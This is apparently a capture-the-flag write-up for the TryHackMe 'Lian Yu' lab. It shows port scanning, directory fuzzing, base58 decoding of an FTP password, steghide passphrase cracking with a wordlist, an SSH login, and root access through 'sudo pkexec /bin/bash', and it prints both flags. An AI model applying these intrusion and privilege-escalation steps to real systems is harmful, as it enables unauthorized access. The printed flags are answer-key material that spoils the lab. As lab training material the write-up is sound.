# Lian yu

<img src="lian-yu.jpeg" alt="lian-yu" width=200/>

## Enumeration

### nmap
```
PORT    STATE SERVICE REASON  VERSION
21/tcp  open  ftp     syn-ack vsftpd 3.0.2
22/tcp  open  ssh     syn-ack OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
| ssh-hostkey: 
|   1024 56:50:bd:11:ef:d4:ac:56:32:c3:ee:73:3e:de:87:f4 (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAOZ67Cx0AtDwHfVa7iZw6O6htGa3GHwfRFSIUYW64PLpGRAdQ734COrod9T+pyjAdKscqLbUAM7xhSFpHFFGM7NuOwV+d35X8CTUM882eJX+t3vhEg9d7ckCzNuPnQSpeUpLuistGpaP0HqWTYjEncvDC0XMYByf7gbqWWU2pe9HAAAAFQDWZIJ944u1Lf3PqYCVsW48Gm9qCQAAAIBfWJeKF4FWRqZzPzquCMl6Zs/y8od6NhVfJyWfi8APYVzR0FR05YCdS2OY4C54/tI5s6i4Tfpah2k+fnkLzX74fONcAEqseZDOffn5bxS+nJtCWpahpMdkDzz692P6ffDjlSDLNAPn0mrJuUxBFw52Rv+hNBPR7SKclKOiZ86HnQAAAIAfWtiPHue0Q0J7pZbLeO8wZ9XNoxgSEPSNeTNixRorlfZBdclDDJcNfYkLXyvQEKq08S1rZ6eTqeWOD4zGLq9i1A+HxIfuxwoYp0zPodj3Hz0WwsIB2UzpyO4O0HiU6rvQbWnKmUaH2HbGtqJhYuPr76XxZtwK4qAeFKwyo87kzg==
|   2048 39:6f:3a:9c:b6:2d:ad:0c:d8:6d:be:77:13:07:25:d6 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDRbgwcqyXJ24ulmT32kAKmPww+oXR6ZxoLeKrtdmyoRfhPTpCXdocoj0SqjsETI8H0pR0OVDQDMP6lnrL8zj2u1yFdp5/bDtgOnzfd+70Rul+G7Ch0uzextmZh7756/VrqKn+rdEVWTqqRkoUmI0T4eWxrOdN2vzERcvobqKP7BDUm/YiietIEK4VmRM84k9ebCyP67d7PSRCGVHS218Z56Z+EfuCAfvMe0hxtrbHlb+VYr1ACjUmGIPHyNeDf2430rgu5KdoeVrykrbn8J64c5wRZST7IHWoygv5j9ini+VzDhXal1H7l/HkQJKw9NSUJXOtLjWKlU4l+/xEkXPxZ
|   256 a6:69:96:d7:6d:61:27:96:7e:bb:9f:83:60:1b:52:12 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPfrP3xY5XGfIk2+e/xpHMTfLRyEjlDPMbA5FLuasDzVbI91sFHWxwY6fRD53n1eRITPYS1J6cBf+QRtxvjnqRg=
|   256 3f:43:76:75:a8:5a:a6:cd:33:b0:66:42:04:91:fe:a0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDexCVa97Otgeg9fCD4RSvrNyB8JhRKfzBrzUMe3E/Fn
80/tcp  open  http    syn-ack Apache httpd
|_http-server-header: Apache
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Purgatory
111/tcp open  rpcbind syn-ack 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          37365/udp6  status
|   100024  1          43176/udp   status
|   100024  1          43894/tcp   status
|_  100024  1          44640/tcp6  status
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

### ffuf
```
.htaccess               [Status: 403, Size: 199, Words: 14, Lines: 8]
.htpasswd               [Status: 403, Size: 199, Words: 14, Lines: 8]
island                  [Status: 301, Size: 235, Words: 14, Lines: 8]
server-status           [Status: 403, Size: 199, Words: 14, Lines: 8]

2100                    [Status: 301, Size: 240, Words: 14, Lines: 8]

green_arrow             [Status: 200, Size: 71, Words: 10, Lines: 7]

```

Ha! the author is an arrowverse fan. cool! 

Fuzzing with big.txt only got me one directory "island"

When I visit it there is a hidden "code word" in the source code: `vigilante`

```
<!DOCTYPE html>
<html>
<body>
<style>

</style>
<h1> Ohhh Noo, Don't Talk............... </h1>

<p> I wasn't Expecting You at this Moment. I will meet you there </p><!-- go!go!go! -->

<p>You should find a way to <b> Lian_Yu</b> as we are planed. The Code Word is: </p><h2 style="color:white"> vigilante</style></h2>

</body>
</html>
```

where is that directory I was supposed to find first? in numbers?

I made a quick list of 4 characters numbers to fuzz faster and got `2100` in island directory

`seq 1000 10000 > numbers.txt`

We need to find a file now. The fuzzing is strong in here!

I tried to fuzz for extensions using this

`ffuf -w /usr/share/wordlists/dirb/extensions_common.txt:FUZZ  -u http://10.10.56.222/island/2100/indexFUZZ`

But only html was accepted, but the file we are looking for is definitelly not html

Then I read source code again

`<!-- you can avail your .ticket here but how?   -->`

we got our extension...lets fuzz!

found `green_arrow.ticket`

```
This is just a token to get into Queen's Gambit(Ship)

RTy8yhBQdscX
```

dont be fooled its not base64 its `base58`

cyberchef said the password is : `!#th3h00d`

and we trusted that...we ftp as vigilante

```
└──╼ $ftp 10.10.56.222                                                                                      
Connected to 10.10.56.222.
220 (vsFTPd 3.0.2)
Name (10.10.56.222:nair0lf32): vigilante
331 Please specify the password.
Password:
230 Login successful.
```

We take everything (and give nothing back)

So we got...files and images

`aa.jpg`  

<img src="aa.jpg" alt="aa" width=200/>  




`Queen's_Gambit.png`

<img src="Queen's_Gambit.png" alt="queensgambit" width=200/>



`Leave_me_alone.png`

This file got weird metadata and is acting weird

I will definitelly not leave it alone

We also got .other_user with a mad long text about `slade` and the rest is not very useful


we all know its steganoraphy but wich file?

```
$steghide --info aa.jpg
"aa.jpg":
format: jpeg
	capacit�: 11,0 KB
	Essayer d'obtenir des informations � propos des donn�es incorpor�es ? (o/n) o
	Entrez la passphrase: 
	
```
aa.jpg is pretty sus' but we got no passphrase


I googled "crack steghide passphrase" XD

found stegCracker a kali tool

`sudo pip install stegcracker`

```
└──╼ $stegcracker aa.jpg /usr/share/wordlists/rockyou.txt
StegCracker 2.1.0 - (https://github.com/Paradoxis/StegCracker)
Copyright (c) 2021 - Luke Paris (Paradoxis)

StegCracker has been retired following the release of StegSeek, which 
will blast through the rockyou.txt wordlist within 1.9 second as opposed 
to StegCracker which takes ~5 hours.

StegSeek can be found at: https://github.com/RickdeJager/stegseek

Counting lines in wordlist..
Attacking file 'aa.jpg' with wordlist '/usr/share/wordlists/rockyou.txt'..
Successfully cracked file with password: password
Tried 68 passwords
Your file has been written to: aa.jpg.out
password

```

that was fast and the password was not even guess-able!

Anyway...it even already extrated the content for us

We got `passwd.txt` wich is full of text...stuff

and `shado` that got our password for ssh 

`M3tahuman`

For the username I went with `slade` as its the only one we are sure about

```
└──╼ $ssh slade@10.10.160.96
slade@10.10.160.96's password: 
                              Way To SSH...
                          Loading.........Done.. 
                   Connecting To Lian_Yu  Happy Hacking

██╗    ██╗███████╗██╗      ██████╗ ██████╗ ███╗   ███╗███████╗██████╗ 
██║    ██║██╔════╝██║     ██╔════╝██╔═══██╗████╗ ████║██╔════╝╚════██╗
██║ █╗ ██║█████╗  ██║     ██║     ██║   ██║██╔████╔██║█████╗   █████╔╝
██║███╗██║██╔══╝  ██║     ██║     ██║   ██║██║╚██╔╝██║██╔══╝  ██╔═══╝ 
╚███╔███╔╝███████╗███████╗╚██████╗╚██████╔╝██║ ╚═╝ ██║███████╗███████╗
 ╚══╝╚══╝ ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝╚══════╝


        ██╗     ██╗ █████╗ ███╗   ██╗     ██╗   ██╗██╗   ██╗
        ██║     ██║██╔══██╗████╗  ██║     ╚██╗ ██╔╝██║   ██║
        ██║     ██║███████║██╔██╗ ██║      ╚████╔╝ ██║   ██║
        ██║     ██║██╔══██║██║╚██╗██║       ╚██╔╝  ██║   ██║
        ███████╗██║██║  ██║██║ ╚████║███████╗██║   ╚██████╔╝
        ╚══════╝╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝    ╚═════╝  #

```

I love ascii art so I needed to share it

But I love flags more and I got one right in this folder

```
slade@LianYu:~$ cat user.txt
THM{Dc_comics_fans_got_arrow}
                        --Felicity Smoak

```

## Privilege Escalation

```
slade@LianYu:~$ sudo -l
[sudo] password for slade: 
Matching Defaults entries for slade on LianYu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User slade may run the following commands on LianYu:
    (root) PASSWD: /usr/bin/pkexec

```

This one is famous lol and very straightforward

pkexec litterally execute commands so just tell him to spawn a shell

As we do it as root its a root shell

```
slade@LianYu:~$ sudo pkexec /bin/bash
root@LianYu:~# id
uid=0(root) gid=0(root) groups=0(root)
```

Touché! 

now get the root flag
```
root@LianYu:~# cat root.txt
                          Mission accomplished



You are injected me with Mirakuru:) ---> Now slade Will become DEATHSTROKE. 



THM{Marvel_comics_fans_got_hawkeye}
                                                                              --DEATHSTROKE

Let me know your comments about this machine :)
I will be available @twitter @User6825
```

And goodbye!






